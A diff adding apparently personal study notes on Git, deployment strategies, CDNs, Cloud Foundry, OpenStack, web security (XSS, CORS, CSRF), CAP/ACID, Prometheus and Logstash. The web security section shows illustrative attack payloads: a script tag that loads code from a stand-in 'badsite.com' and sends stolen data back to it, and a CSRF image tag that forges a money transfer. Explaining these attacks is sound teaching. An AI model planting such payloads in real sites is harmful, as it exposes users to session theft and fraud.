+Make sure to mirror the same needed packages in the Master and the Slave (Packer, Git, etc).
+
+
+[GIT]
+Git is one of the most popular version control systems (VCS) on the market today. It's an actively-maintained open-source project. It was developed by Linus Torvalds in 2005.
+By design, Git is a distributed version control system. It's designed on performance, security and flexibility.
+
+GIT VS OTHER VCS:
+Git stores and thinks about information in a very different way.
+Most other VCS systems store information as a list of file-based changes (Delta-based version control).
+Git doesn't store data that way. Git takes snapshots of the current state.
+
+HOW GIT WORKS:
+Almost all operations are local.
+It uses checksums to maintain data integrity.
+Nearly all of Git actions only add data.
+Git file states:
+    - Committed. Data is safely stored in the Git database.
+    - Modified. Changes not yet committed.
+    - Staged. Changes ready to be committed.
+
+The Git directory is where metadata and an object database are stored. This is what is cloned locally.
+The working tree pulled from the Git directory.
+The staging area is a file in the Git directory.
+The basic Git workflow:
+    - Files are modified.
+    - Changes are selectively staged.
+    - Commit the changes that are staged.
+
+
+[GIT COMMAND LINE]
+To install git:
+    yum install -y git  # Installs git.
+
+Create a repository in GitHub.
+
+Generate an SSH key.
+    ssh-keygen -t rsa -b 4096  # Generates an ssh key.
+
+Add your newly-generated ssh key into your GitHub account.
+    GitHub page -> Account options -> Settings -> SSH and GPG keys -> New SSH key -> Add title and ssh public key.
+
+Clone the GitHub repository into your local.
+    git clone git@github.com:luisnaranjo/git-test.git
+
+COMMAND git init: Initialize a Git repository locally.
+Example:
+    git init    # Initializes a git repo in the current directory.
+
+COMMAND git status: Check the status of the Git repository.
+Example:
+    git status  # Display the status of current Git repository.
+
+COMMAND git add: Stage file/files.
+Example:
+    git add .   # Stage any files in the current directory.
+
+COMMAND git commit: Commit staged changes.
+Flags:
+    - -a: Commit all changed files.
+    - -m MESSAGE: Add a comment to the commit.
+    - --amend: Allow you to modify last commit.
+    - --amend --reset-author: Update the last commit with the updated name and email.
+Structure:
+    git commit [OPTIONS]
+Example:
+    git commit -am "Adding index file." # Commit the staged changes with the comment specified.
+    git commit --amend -m "Last commit updated."    # Modify last commit with new staged changes.
+
+COMMAND git rm: Removes changes from Git.
+Flags:
+    - --cached: Only remove from the index (staged changes).
+Structure:
+    git rm [OPTIONS]
+Example:
+    git rm --cached file1   # Removed changes made in file1 from the staged changes.
+    git rm file2    # Removes the file2 from the repository (it will generate a new un-staged change, and you will need to stage and commit the change).
+
+COMMAND git reset: Allows you to reset the state of the working directory (un-staged and/or staged changes).
+Flags:
+    - --hard: Reset the working directory back to the state of previous commit.
+Example:
+    git reset --hard    # Resets back to the state of the previous commit.
+
+COMMAND git revert: Allow you to create a new commit to revert the changes of an specified previous commit.
+Example:
+    git revert HEAD # Reverts the working directory into the state before the HEAD (last) commit.
+
+COMMAND git mv: Allow you to move files. As in contrast to the Linux mv command, it will not delete the file and re-create it.
+Example:
+    git mv myfile myDir/myfile  # Moves the position of the file.
+
+COMMAND git stash: Stash the changes in a dirty working directory away.
+Use git stash when you want to record the current state of the working directory and the index, but want to go back to a clean working directory.
+The command saves your local modifications away and reverts the working directory to match the HEAD commit.
+
+COMMAND git push: Push commits to the remote repository (origin).
+Example:
+    git push origin master  # Push the commits to the remote repository from the master branch.
+
+COMMAND git pull: Pull commits from the remote repository that are not in our local repository.
+Example:
+    git pull origin master  # Pulls the un-synched commits from origin/master.
+
+COMMAND git branch: Allow you to work with branches.
+Example:
+    git branch  # Display the current branch.
+
+COMMAND git remote: Allow you to work with remote repositories. Keep in mind origin configuration is scoped at repository level, not global.
+Example:
+    git remote -v   # Display your current remote repositories.
+    git remote add origin git@github.com:luisnaranjo/git-test.git   # Configures the remote repository in origin.
+
+COMMAND git config: Used to set/retrieve git configurations.
+Example:
+    git config --global user.name "My user"     # Sets the user name.
+    git config --global user.email "myuser@example.com" # Sets the user's email.
+
+COMMAND git log: Display the commit history.
+Example:
+    git log # Displays the commit history.
+
+COMMAND git show: Display last commit along with the changes made to files in that commit.
+Example:
+    git show    # Displays last commit along with the changes made to files in that commit.
+
+COMMAND git diff: Allow you to display the changes made in a file.
+Example:
+    git diff index.html # Display the changes made since last commit.
+
+
+[GIT: BRANCHING AND MERGING]
+Locally created branches can be push to remote repositories by using 'git push REMOTEREPO BRANCH'.
+
+COMMAND git branch: Allow you to work with Git branches.
+Flags:
+    - d: Delete fully merged branch.
+    - D: Delete branch even if it's not merged.
+Example:
+    git branch      # Display current branches.
+    git branch dev  # Creates the 'dev' branch in current repository.
+    git branch -d feature_branch   # Removes the branch if fully merged.
+
+COMMAND git checkout: Allow you to navigate through branches.
+Flags:
+    - -b: Create the branch and switch into it.
+Example:
+    git checkout dev    # Switches you to the dev branch.
+
+COMMAND git merge: Allow you to merge changes from branches. It preserves the history of the merged branch.
+Example:
+    git checkout dev && git merge feature_branch    # Merge the feature_branch into dev branch.
+
+COMMAND git rebase: Allow you to merge branches. The merge will look just as a new commit. It won't come with all the history of commits done in the merged branch.
+Example:
+    git checkout dev && git rebase new_feature  # Merge the new_feature into dev branch.
+
+
+[GIT SUBMODULES]
+A submodule in git is having a repository inside your repository.
+If you need a code form a different repository you don't have copy the code on your repo, instead you reference the external repository.
+
+FILE .gitmodules: File containing the submodules specifications (module, path & url).
+To remove modules you can modify this file or remove the file completely.
+Example:
+    [submodule "git-test"]
+        path = git-test
+        url = https://github.com/luisnaranjo/git-test.git
+
+Copy the external repository. Add the external repository as a submodule by using the 'git submodule' command.
+    git submodule add https://github.com/luisnaranjo/git-test.git   # Adds the external repository as a submodule.
+
+COMMAND git submodule: Allow you to work with submodules (external repositories).
+Flags:
+    - add: Add a submodule.
+    - rm --cached: Remove a submodule from the cache.
+Example:
+    git submodule add https://github.com/luisnaranjo/git-test.git   # Adds the external repository as a submodule.
+
+
+[TAGGING IN GIT]
+Tags are a fixed point in your repositories history and are a good way to deploy your code to production.
+
+COMMAND git tag: Allow you to work with Git tags.
+To push the tag to the remove repository you need to use 'git push REMOTEREPO TAG'.
+You can switch to the tag using the 'git checkout TAG'.
+Flags:
+    - -d TAG: Delete a tag.
+Structure:
+    git tag [TAG]
+Example:
+    git tag         # Display all tags in repository.
+    git tag v1.0    # Add a tag to the current commit in current branch.
+    git push origin v1.0    # Push the tag to the remote repo.
+    git tag -d v1.0 # Deletes the tag.
+
+
+[DEPLOYING CODE TO PROD: IMMUTABLE SERVERS]
+In a traditional mutable server infrastructure, servers are continually updated and modified in place.
+Engineers and admins working with this kind of infrastructure can SSH into their servers, upgrade or downgrade packages manually, tweak configuration files on a server-by-server basis, and deploy new code directly onto existing servers.
+In other words, these servers are mutable. They can be changed after they're created. Infrastructure comprised of mutable servers can itself be called mutable, traditional, or artisanal.
+
+An immutable infrastructure is another infrastructure paradigm in which servers are never modified after they're deployed.
+If something needs to be updated, fixed, or modified in any way, new servers built from a common image with the appropriate changes are provisioned to replace the old ones.
+After they are validated, they're put into use and the old ones are decommissioned.
+
+The benefits of an immutable infrastructure include more consistency and reliability in your infrastructure and a simpler, more predictable deployment process.
+It mitigates or entirely prevents issues that are common in mutable infrastructures, like configuration drift and snowflake servers.
+However, using it efficiently often includes comprehensive deployment automation, fast server provisioning in a cloud computing environment, and solutions for handling stateful or ephemeral data like logs.
+
+Immutable servers means to replace the server, don't update it. Rather than updating configurations in an existing one, we replace it with a new one.
+In this approach we pre-back images with everything they need. In this way, images can be tested.
+Failed images are rejected. Passing images go to production.
+
+CREATING IMMUTABLE SERVERS:
+Boot a server instance from an origin image.
+Configure the server instance into the desired state.
+Save the server instance to a new server image.
+Boot a test server instance from the new image.
+Run automated tests against the test server instance.
+Use CI or CD tools to automate deploys.
+Use a deployment strategy like Blue-Green or Canary.
+
+IMMUTABLE SERVERS VS CONFIGURATION MANAGEMENT:
+Disposability vs persistence.
+Changes applied to the base image vs running systems.
+Tested vs untested servers.
+Data is not stored locally.
+
+
+[DEPLOYING CODE TO PROD: BLUE-GREEN DEPLOYMENTS]
+There is 2 ways of approaching to blue-green deployments, depending if its cloud or traditional environments.
+With Blue-Green deployments you have your current live environment of your application as the Blue environment.
+When you need to make updates in your environment, you spin a new environment that will be the green environment. This green environment will have a mirror of the blue environment plus the updates.
+Once the green environment is tested and working as expected, the traffic is redirected to the green environment, and so, becoming the new blue environment. If something is wrong with the new blue environment you can just redirect the traffic to the old environment.
+In a cloud environment you can destroy the old environment since it's no longer needed.
+In a traditional environment, the old environment (the initial blue) becomes the new green environment.
+
+
+[DEPLOYING CODE TO PROD: CANARY DEPLOYMENTS]
+Canary deployments are a popular Continuous Deployment strategy, where a small portion of the fleet is updated to the new version of your application.
+This subset, the canaries, then serve as the proverbial canary in the coal mine.
+
+Canaries were once regularly used in coal mining as an early warning system. Toxic gases such as carbon monoxide in the mine would kill the bird before affecting the miners.
+Signs of distress from the bird indicated to the miners that conditions where unsafe.
+
+A Canary deployment method is very similar to the blue-green deployment. These techniques are used to reduce the risk of deploying new version of your code to production.
+We do this by slowly rolling out the changes to a small subset of users before rolling out the entire system to everybody.
+Same as with blue-green deployments, we have an old and new environment versions, at the start we redirect a small amount of traffic (let say 10%) to the new environment, and increasing the amount over time (when getting more confident about the new environment).
+Eventually if everything is running as expected, all the traffic is redirected to the new environment.
+An advantage of this type of deployment is capacity testing. Due we slowly ramp up the load, we can monitor and capture metrics about the new version and impacts in production.
+Another way of handling a canary deployment is through the use of feature flags or feature toggles. This enables features only for a subset of users (internal users, or by using profile/demographics).
+
+
+[CONTENT DELIVERY NETWORK (CDN)]
+A Content Delivery Network aka CDN, is a geographical distributed network of proxy servers and their data centers that work together to provide fast delivery of Internet content.
+    - Images.
+    - JavaScript.
+    - HTML files.
+It minimizes the distance between the visitors and your website's server.
+Content Delivery Networks are responsible for serving up the majority of the Internet's content.
+CDNs aren't a replacement for proper web hosting, but helps cache the content.
+
+BENEFITS:
+Uptime reliability.
+Improving website load times.
+Reducing bandwidth costs.
+Increasing content availability and redundancy.
+Improving website security.
+
+PUSH VS PULLS CDNS:
+There are two types of CDNs.
+    - Push: Content is distributed pro-actively (you are responsible to push content) to edge servers in the CDN locations.
+            The visitor's requests goes to the closest points of presence (PoP) location rather than the origin server.
+            You are responsible to push content into the CDN.
+    - Pull: The end-user sends the request that pulls content from nearest edge server.
+            If the content doesn't exists in the edge server, the CDN pulls the content from origin and caches it.
+            If the content is not already cached, the first viewer may face slow response due the CDN will pull the content from origin.
+
+
+[CLOUD FOUNDRY]
+Cloud Foundry is an open source cloud platform as a service on which developers can build, deploy, and run their applications.
+It allows you to focus on the development rather than where is going to be deployed.
+It was originally developed by VMware, and then transferred to Pivotal Software.
+Originally Written in Ruby, Go and Java. And released in 2011.
+Cloud Foundry can be run in any IaaS platform (IaaS platform agnostic).
+Allows you to focus in build, test, deploy your apps easily.
+It's available as open source, commercial product or through a hosting provider.
+The CLI is supported on Linux, Mac and Windows.
+It support any language or framework by using buildpacks. Supports Docker Images.
+
+In Cloud Foundry, the application is the unit of currency. The platform frees developers to focus on application code only, handing off the complexity of building, managing, and running containerized workloads to Cloud Foundry.
+With Cloud Foundry, developers are freed from the burden of defining and maintaining containers, provisioning and managing services, and complex configurations for things like ingress networking.
+
+OPEN SOURCE DISTRIBUTIONS:
+There are 3 major opensource distributions under development:
+    - Cloud Foundry developed by BOSH: The oldest and most widely used distribution whereby Cloud Foundry components are deployed on VMs on any IaaS.
+    - KubeCF:   The most widely-adopted Cloud Foundry distribution available for K8s that you can install yourself.
+                This distribution uses the "cf-operator" to containerize the same BOSH releases above for deployment on K8s.
+    - CF for K8s: On-going project that is repacking Cloud Foundry for K8s, and also switching some internal components for more K8s-native equivalents.
+
+SUPPORTED LANGUAGES:
+    - Java.
+    - Python.
+    - Node.js.
+    - Ruby.
+    - Go.
+    - .NET.
+
+SUPPORTED IAAS PLATFORMS:
+    - VMware vSphere.
+    - AWS.
+    - Google Cloud Platform.
+    - Azure.
+    - OpenStack.
+
+CLOUD FOUNDRY PROVIDERS:
+    - Atos Canopy.
+    - CenturyLink App Fog.
+    - GE Predix.
+    - HPE Helion Stackato 4.0.
+    - Huawei FusionStage.
+    - IBM Bluemix.
+    - Pivotal Cloud Foundry.
+    - SAP Cloud Foundry.
+    - Swisscom Application Cloud.
+
+COMMAND cf:
+The base Cloud Foundry command.
+Structure:
+    cf SUBCOMMAND
+
+COMMAND cf push:
+Push the application up to Cloud Foundry.
+Structure:
+    cf push APPNAME --random-route
+
+COMMAND cf apps:
+List your applications in Cloud Foundry. Also able to provide more information if an appname is specified.
+Structure:
+    cf apps [APPNAME]
+
+CLOUD FOUNDRY MANIFEST:
+You can declare a manifest file having the details of your application (name, disk quota, instances, memory, routing info, etc).
+Example:
+    applications:
+    - name: APPNAME
+      disk_quota: 256M
+      instances: 1
+      memory: 256M
+      random-route: true
+
+
+[OPENSTACK]
+OpenStack is an open-source IaaS platform for cloud computing. It allows you to control large pools of:
+    - Compute.
+    - Storage.
+    - Networking.
+It was created by Rackspace Hosting and NASA in 2010. Written mostly in Python and free under the Apache 2.0 license.
+
+OPENSTACK COMPONENTS:
+Compute (Nova): Nova is the cloud computing fabric controller. It's designed to go and manage and automate pools of compute resources, which can work with a wide variety of virtualization technologies
+                - Bare metal.
+                - High-performance computing.
+                - KVM.
+                - VMWare.
+                - Xen.
+
+Networking(Neutron): Neutron is the networking component of OpenStack. It allows you to manage IP addresses, including dedicated IP address and DHCP.
+                    You can create your networks and control the traffic. You can also connect servers and devices to the one or more networks. It can be used with OpenFlow.
+
+Block storage(Cinder): Cinder is the block storage component of OpenStack. It allows you to manage persistent block level storage and attach them to compute instances.
+
+Identity(Keystone): Keystone is OpenStack ID management system. It authorizes users, services, and endpoints. It uses tokens for authentication as well as maintain states.
+
+Image(Glance): Glance is the OpenStack image service. It acts as the image registry. It allows you to manage VM images, disk images and snapshots.
+
+Object storage(Swift): Swift is the object storage component of OpenStack. Ideal for storing large amounts of unstructured data that has the capacity to grow.
+
+Dashboard(Horizon): Horizon is the OpenStack dashboard. It provides a web interface that allows you to interface with various OpenStack components.
+
+Orchestration(Heat): It's the orchestration component of OpenStack. It works alongside with Ceilometer service to provide autoscaling.
+
+Workflow(Mistral): Mistral is the OpenStack workflow service. Allows you to define tasks and workflows, manage and execute them in the cloud, without having to write any code.
+
+Telemetry(Ceilometer): Ceilometer is the telemetry service of OpenStack. It's responsible for metering information. You can also have a generated bills based on the utilization.
+                        It has an API that can be used to interface with an external billing system. You can also create alarms.
+
+Database(Trove): Trove is the OpenStack database service. Similar to RDS. It provides isolation at High Performance. Allows you to automate complex administrator tasks (deployments, configuration, patching, backups, restores, and monitoring).
+
+Elastic Map Reduce(Sahara): Sahara is used to provision Hadoop clusters. You can specify the version of Hadoop, cluster type, etc. It deploys the cluster in a matters of minutes. You can also manage pre-existing Hadoop clusters.
+
+Baremetal(Ironic): It was originally part of the Nova bare metal driver. But it evolved to the point where it became its own separate project. It uses pixie for provisioning bare metal.
+
+Messaging(Zaqar): Zaqar is OpenStack multi-tenant cloud messaging service. Great for Web and mobile applications.
+
+Shared file system(Manila): OpenStack shared filesystem component.
+
+DNS(Designate): OpenStack DNS service. It has a multi-tenant REST API for managing DNS.
+
+Search (Searchlight): It offloads queries from existing API services and indexes their data into Elastic Search.
+
+Key manager(Barbican): OpenStack Key Manager. Allows you to provision and manage secrets with OpenStack.
+
+Container orchestration(Magnum): Magnum is a set of OpenStack APIs. Offers orchestration engines such as Docker Swarm, Kubernetes, etc.
+
+Root Cause Analysis(Vitrage): OpenStack root-cause analysis system.
+
+Rule-based alarm actions(Aodh): OpenStack alarming system.
+
+
+[CROSS SITE SCRIPTING]
+Cross Site Scripting represents 47% of website vulnerabilities.
+
+INJECTION THEORY:
+Injection is an attacker's attempt to send data to an application in a way that will change the meaning of the command being sent to an interpreter. Typical interpreters in the web development:
+    - SQL.
+    - LDAP.
+    - OS.
+    - XPath.
+    - XQuery.
+    - Expression language.
+If we have a command interface + data = we are susceptible.
+Cross-site scripting is HTML injection. Interpreters run with a lot of access.
+This is due poorly thought through security.
+
+CROSS SITE SCRIPTING:
+Cross-Site Scripting (XSS) is a type of injection attack.
+This works by malicious scripts are injected into trusted websites.
+XSS PHP example:
+    echo "The value you entered is: ".$\_GET['val'];
+    https://example.com/test.php?val=123
+    https://example.com/test.php?val=<script>alert('Proof this is an XSS');</script>
+
+There are two types of XSS Vulnerabilities:
+    - Reflected: The attacker sends a link to a victim, example:
+                    https://example.com/test.php?val=<script src="http://badsite.com/badscript.js"></script>
+                The victim clicks the link and visits the site.
+                The vulnerability loads a script from an external site into the target page.
+                The script has full access to the browser DOM environment.
+                The script performs a malicious action as the signed-in user:
+                    https://badsite.com/badPretendImage.jpg?stolendata=secretDataValues
+    - Stored: A stored XSS attack is more dangerous than a reflected vulnerability:
+                * A stored XSS attack can be automated.
+                * A victim in a stored XSS attack doesn't have to take any action.
+            Malicious data is stored in a database or some other storage mechanism.
+            When a visitor visits the site, the malicious action is executed.
+
+HOW TO MITIGATE XSS VULNERABILITES:
+- Enable 'HttpOnly' flag. It prevents JavaScript from accessing cookies. Cookies can have very sensitive data.
+- Validate your data:
+    * Is the data an integer (0 to 9 digits only)?
+    * Is the data a float with a decimal point allowed(0 to 9 and . character)?
+    * Is the data numbers and dashes, e.g., a credit card date field?
+    * Is the data a string with numbers, letters, spaces, and punctuation only?
+- Escape and sanitize your data.
+
+
+[CORS HEADERS]
+The browser's same-origin policy blocks reading a resource from a different origin. This mechanism stops malicious site from reading another site's data, but it also prevents legitimate uses.
+In a modern web application, an application often wants to get resources from a different origin. For example, you want to retrieve JSON data from a different domain or load images from another site into a "<canvas>" element.
+In other words, there are public resources that should be available for anyone to read, but the same-origin policy blocks that.
+Developers have used work-arounds such as JSONP, but Cross-Origin Resource Sharing (CORS) fixes this in a standard way.
+
+Cross-Origin Resource Sharing (CORS) is a mechanism that allows restricted resources on a web page to be requested from another domain.
+The Cross-Origin resource Sharing standard works by adding new HTTP headers that let servers describe which origins (from a server at a different origin) are permitted to read that information from a web browser.
+A cross-origin HTTP request is made when a resource has a different origin. Example:
+    - Domain.
+    - Protocol.
+    - Port.
+
+WHAT REQUESTS USE CORS?:
+- XMLHttpRequest or Fetch APIs in a cross-site manner.
+- Web Fonts.
+- WebGL textures.
+- Image/Video.
+- Stylesheets.
+- Scripts.
+
+PRE-FLIGHT REQUEST:
+CORS also relies on a mechanism by which browsers make a "pre-flight" request to the server hosting the cross-origin resource, in order to check that the server will permit the actual request.
+In that pre-flight, the browser sends headers that indicate the HTTP method and headers that will be used in the actual request:
+The following HTTP request methods use a pre-flight request (requests that uses methods other than GET, POST, or HEAD. Also known as complex requests):
+    - PUT.
+    - DELETE.
+    - CONNECT.
+    - OPTIONS.
+    - TRACE.
+    - PATCH.
+Browsers create a pre-flight request if needed. The pre-flight requests use the OPTIONS header. Example:
+    OPTIONS /data HTTP/1.1
+    Origin: https>//example.com
+    Access-Control-Request-Method: DELETE
+On the server side, an application needs to respond to the pre-flight request with information about the methods the application accepts from the origin. Example:
+    HTTP/1.1 200 OK
+    Access-Control-Allow-Origin: https://example.com
+    Access-Control-Allow-Methods: GET, DELETE, HEAD, OPTIONS
+The server response can also include an "Access-Control-Max-Age" header to specify the duration (in seconds) to cache pre-flight results so the client doesn't need to make a pre-flight request every time it sends a complex request.
+
+CORS HEADERS:
+Access-Control-Allow-Origin: Indicate whether or not the response can be shared.
+Access-Control-Allow-Credentials: Indicate whether the response to the request can be exposed when the credential flag is set to true.
+Access-Control-Allow-Headers: Used with a pre-flight request to indicate which HTTP headers can be used when making the actual request.
+Access-Control-Allow-Methods: Used with a pre-flight request. It tells the client what methods can be allowed (PUT, DELETE, ETC).
+Access-Control-Expose-Headers: Indicate which headers could be exposed as part of response and list them by their names.
+Access-Control-Max-Age: How long a pre-flight request can be cached.
+Access-Control-Request-Headers: Used with a pre-flight request. Let's the server know with HTTP headers will be used when the actual request comes through.
+Access-Control-Request-Method: Used with a pre-flight request. Let's the server know with HTTP methods will be used when the actual request is made.
+Origin: Indicate where the fetch originally came from.
+
+
+[CSRF TOKENS]
+CSRF stands for Cross-Site Request Forgery. This is a client-side Web Application attack.
+Attackers tricks victim into executing a malicious web request. The victim issues an unexpected request to the web server.
+A CSRF attack works because browser requests automatically include all cookies including session cookies. Therefore, if the user is authenticated to the site, the site cannot distinguish between legitimate requests and forged requests.
+
+CSRF ATTACK EXAMPLE:
+    <img src="http://example.com/transfermoney.php?to=attackeraccnt&amount=10000" height="10px" width="10px">
+    <a src="http://example.com.hackersite.com/" height="10px" width="10px">Click Me, I'm Harmless!</a>
+
+ANTI-CSRF TOKEN:
+Anti-CSRF tokens are used to prevent attackers issuing requests by the victim.
+1. User issues a request to the website.
+2. The server calculates two cryptographically related tokens and sends it to the user with the response.
+3. One token is send as a hidden field in the form. Tokens are randomly generated per request.
+5. The other is sent in Set-Cookie header of the response.
+6. When the user submits the request, the two tokens are sent back to the server.
+7. The server compares these two tokens for forgery/misinformation.
+8a. If the tokens match, the server validates the request.
+8b. If the tokens don't match the server returns an error.
+
+HTTP REQUEST EXAMPLE:
+    GET /transfermoney.php HTTP/1.1
+    Host: example.com
+    User-Agent: Mozilla/5.0 (Windows NT 6.1;WOW64; rv:28.0) Gecko/20100101 Firefox/28.0
+    Accept: text/html, application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip,deflate
+
+CSRF TOKEN EXAMPLE:
+    Header:
+    HTTP/1.1 200 OK
+    Date: Fri, 21 Feb 2014 07:45:52 GMT
+    Server: Apache/2.2.14(Ubuntu)
+    X-Powered-By: PHP/5.3.2-1ubuntu4.5
+    Set-Cookie:sd9f9sdf9vsd9fg9sfgsdfsdfawef34234knl32k4n3k; csrftoken=0s0d00e9sdfwewrui33j; path=/
+
+    Form field:
+    <form>
+    <input type="text" name="accnt" value="1232344" />
+    <input type="text" name="amount" value="10000" />
+    <input type="hidden" name="anticsrf_token" value="211234j32j4i4jf" />
+    </form>
+
+
+[CAP THEOREM]
+Have you ever seen an advertisement for a landscaper, house painter, or some other tradesperson that starts with the headline "Cheap, Fast, and Good: Pick Two"?
+The CAP theorem applies a similar type of logic to distributed systems. CAP theorem specifically deals with distributed datastores. It's also named as Brewer's theorem. It was created by Eric Brewer.
+A distributed system is a network that stores data on more than one (physical or virtual machines) at the same time. The theorem says that it's impossible for a distributed data store to simultaneously provide more than 2 out of the following guarantees:
+    - Consistency.
+    - Availability.
+    - Partition tolerance.
+
+CONSISTENCY:
+Consistency means that all clients see the same data at the same time, no matter which node they connect to.
+For this to happen, whenever data is written to one node, it must be instantly forwarded or replicated to all the other nodes in the system before the write is deemed 'successful'.
+Every read receives the most recent write or an error.
+
+AVAILABILITY:
+Availability means that any client making a request for data gets a response, even if one or more nodes are down.
+Another way to state this: All working nodes in the distributed system return a valid response for any request, without exception.
+No guarantee that it contains the most recent write.
+
+PARTITION TOLERANCE:
+A partition is a communications break within a distributed system. A lost of temporarily delayed connection between 2 nodes.
+Partition tolerance means that the cluster must continue to work despite any number of communication breakdowns between nodes in the system.
+
+CAP THEOREM NoSQL DB TYPES:
+Today, NoSQL databases are classified based on the 2 CAP characteristic they support:
+    - CP database:  A CP database deliver consistency and partition tolerance at the expense of availability.
+                    When a partition occurs between any 2 nodes, the system has to shut down the non-consistent node until the partition is resolved.
+    - AP database:  An AP database delivers availability and partition tolerance at the expense of consistency.
+                    When a partition occurs, all nodes remain available but those at the wrong end of a partition might return an older version of data than others.
+                    When the partition is resolved, the AP DBs typically resync the nodes to repair all inconsistencies in the system.
+    - CA database:  A CA database delivers consistency and availability across all nodes. It can't do this if there is a partition between any 2 nodes in the system, however, and therefore can't deliver fault tolerance.
+
+
+[ACID & BASE]
+This is focused on Data Bases. ACID is primary for Relational DBs and BASE for No-SQL.
+The CAP theorem states that it's impossible to achieve both consistency and availability in a partition tolerant distributed system.
+The fundamental difference between ACID and BASE database models is the way they deal with this limitation.
+
+The ACID model provides a consistent system.
+The BASE model provides high availability.
+
+ACID:
+The ACID database transaction model ensures that a performed transaction is always consistent. This makes it a good fit for businesses which deal with online transaction processing or online analytical processing.
+In ACID, database transactions are a single local unit of work. Either for accessing data or modifying data.
+Transactions need to follow properties to maintain consistency in a database:
+    - Atomicity: Each transaction is either properly carried out or the process halts and the database reverts back to the state before the transaction started. This ensures the data in the DB is valid.
+    - Consistency: A processed transaction will never endanger the structural integrity of the database.
+    - Isolation: Transactions cannot compromise the integrity of other transactions by interacting with them while they are still in progress.
+    - Durability: The data related to the completed transaction will persists even in the cases of network or power outages. If a transaction fails, it won't impact the manipulated data.
+
+Financial institutions will almost exclusively use ACID databases. Money transfers depend on the atomic nature of ACID.
+One safe way to make sure your DB is ACID compliant is to choose a relational database management system. Examples:
+    - MySQL.
+    - PostgreSQL.
+    - Oracle.
+    - SQLite.
+    - Microsoft SQL Server.
+
+BASE:
+The rise of NoSQL databases provided a flexible and fluid way to manipulate data. As a result, a new database model was designed, reflecting these properties.
+BASE is much looser than ACID guarantees.
+    - Basically Available: Rather than enforcing immediate consistency, BASE modelled NoSQL DBs will ensure availability of data by spreading and replicating it across the nodes of the DB cluster.
+    - Soft state: Due the lack of immediate consistency, data values may change over time. The BASE model breaks off the concept of a DB which enforces its own consistency, delegating that responsibility to developers.
+    - Eventual consistency: The fact that BASE doesn't enforce immediate consistency doesn't mean it never achieves it. However, until it does, data reads are still possible.
+
+A BASE system gives up on consistency (from the CAP theorem).
+
+Just as SQL databases are almost uniformly ACID compliant, NoSQL databases tend to conform to BASE principles. Examples:
+    - MongoDB.
+    - Cassandra.
+    - Redis.
+    - Amazon DynamoDB.
+    - Couchbase.
+
+
+
+----------------------------------------------- SERVICE OPERATIONS -----------------------------------------------
+[PROMETHEUS]
+Prometheus is a monitoring platform that is part of the Cloud Native Computing Foundation project.
+It collects metrics by monitoring systems and services via http endpoints.
+It can trigger alerts if some condition is observed to be true.
+It uses a multi-dimensional data mode. Store all its data as time series.
+Prometheus has its own query language.
+It doesn't have dependency on distributed storage.
+Timeseries collection happens via a pull model over HTTP. Pushing timeseries supported via an intermediary gateway.
+Targets are discovered via service discovery or static configuration.
+Multiple nodes of graphing and dashboarding support.
+In Prometheus, every timeseries data has a Metric name & a label.
+
+EXPORTERS:
+Prometheus was developed for the purpose of monitoring web services.
+    - blackbox_exporter: Allows black box proving endpoints over HTTP/HTTPS/DNS/TCP/ICMP.
+    - consult_exporter: Sends the health of a consulted service to Prometheus.
+    - graphite_exporter: Export metrics from the graphite exporter protocol. Accept data over TCP/UDP.
+    - haproxy_exporter: Scrapes HA proxy stats and exports them into Prometheus using HTTP.
+    - memcached_exporter: Exports metrics from memcache to prometheus.
+    - mysqld_exporter: Used to export MySQL metrics into Prometheus.
+    - node_exporter: Used for exporting machine metrics.
+    - statsd_exporter: Receives statsd style metrics and export them into Prometheus metrics.
+
+NODE EXPORTER:
+Node Exporter has a configurable set of collections for gathering various types of host-based metrics. Hardware and OS exporter. It monitor the metrics for:
+    - Disk I/O statistics.
+    - CPU Load.
+    - Network statistics.
+    - Much more.
+
+PUSHGATEWAY:
+Pushgateway is an intermediary service that push metrics from jobs which cannot be scraped. Only recommended for certain limited cases.
+Great for ephemeral and batch jobs:
+    - These kinds of jobs may not exists long enough to be scrapped.
+    - Push their metrics to a Pushgateway.
+
+ALERTMANAGER:
+Alertmanager is a Prometheus component that handles alerts sent by client applications such as the Prometheus server.
+It routes alerts to:
+    - Email.
+    - PagerDuty.
+    - OpsGenie.
+
+It allows grouping, so you get a single notification from several alerts of same type rather than hundreds of notifications.
+You can set inhibition, to suppress notification for some kind of alerts.
+You can also set silences, for muting alerts for a certain amount of time.
+
+GRAFANA:
+Grafana is a separate tool, it's not part of Prometheus.
+It's an open-source visualization tool. It's used on top of a variety of different data stores:
+    - Graphite.
+    - InfluxDB.
+    - ElasticSearch.
+    - Logz.io
+    - Prometheus.
+
+You can create and edit dashboards. Grafana comes with a unique Graphite target parser.
+
+
+[LOGSTASH]
+Logstash is a real time data collection engine with real time pipeline capabilities.
+Logstash is an opensource tool for collecting, parsing, and storing logs for future use.
+It's part of the elastic stack, which includes Elasticsearch, Beats, Kibana.
+
+Logstash event processing pipelines three stages:
+    - inputs. Generate events.
+    - filters. Modify them.
+    - outputs. Ships them somewhere else.
+Both inputs and outputs supports codex.
+
+INPUTS:
+A pipeline can be configured to have multiple inputs.
+    - File. Reads the content of a file in the file system. Similar to 'tail -f' command.
+    - Syslog. Listen for syslog messages on port 514. Parse the messages according to the RFC3164 format.
+    - Redis. Reads from a redis server. It uses both channels and lists.
+    - Beats. Beats are lightweight data shippers that can be used with both Logstash and ElasticSearch.
+
+FILTERS:
+Filters are used to parse and enrich your data. You can use conditionals to perform certain actions.
+    - Grok. Great for parsing unstructured log data into something more meaningful/queryable.
+    - Mutate. Allows you to transform in a bin field.
+    - Drop. Allows you remove an event completely.
+    - Clone. Allows you to make a copy of an event. You can add or remove fields.
+    - Geoip: Allows you to get geographical information on an IP address.
+
+OUTPUTS:
+Outputs are the final stage of the LogStash pipeline. You can use multiple outputs.
+    - ElasticSearch. Sends event data over ElasticSearch.
+    - File. Write data to a file in a disk.
+    - Graphite. Sends data into Graphite.
+    - Statsd. Sends data to Statsd.
+
+CODECS:
+Codecs can be used to work with your inputs and outputs. Allows you to separate the transport of your messages from the serialization process.
+    - JSON. Allows you to encode and decode JSON data.
+    - Multiline. Merge multiple line text events in to one single line.
+
+GROK:
+Grok parse arbitrary text and structure it. It parse unstructured log data into something structured and queryable. It comes with roughly 120 patters (shortcuts to RegExs).
+Grok is great for:
+    - Parse syslog logs.
+    - Parse Apache logs.
+    - Parse other webserver logs.
+    - MySQL logs.
+    - Any log format written for humans.
+
